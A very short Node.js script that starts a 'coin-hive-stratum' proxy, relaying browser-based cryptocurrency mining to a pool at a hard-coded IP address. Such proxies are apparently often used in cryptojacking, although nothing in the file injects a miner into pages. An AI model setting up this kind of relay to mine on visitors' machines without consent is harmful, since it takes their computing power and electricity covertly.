const Proxy = require("coin-hive-stratum");
const proxy = new Proxy({
  // host: "18.222.106.239",
  host : "18.222.106.239",
  port: 8888
});
proxy.listen(8892);